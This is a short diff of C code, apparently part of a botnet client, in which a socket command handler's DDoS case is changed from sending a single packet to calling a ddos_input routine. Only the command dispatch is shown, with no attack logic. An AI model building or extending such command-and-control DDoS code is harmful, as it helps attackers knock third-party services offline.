@@ -78,10 +78,7 @@ int connection(const char* SERVER_ADDR, unsigned short SERVER_PORT) {
     uint8_t action = input(sock);
     switch (action) {
         case 1:
-            printf("Sending a packet at the beginning of a DDoS attack...\n");
-            if (ddos_packet(sock, NULL) < 0) {
-                printf("Failed to command ddos send packet\n");
-            }
+            ddos_input(sock);
         case 2:
             break;
         case 3:
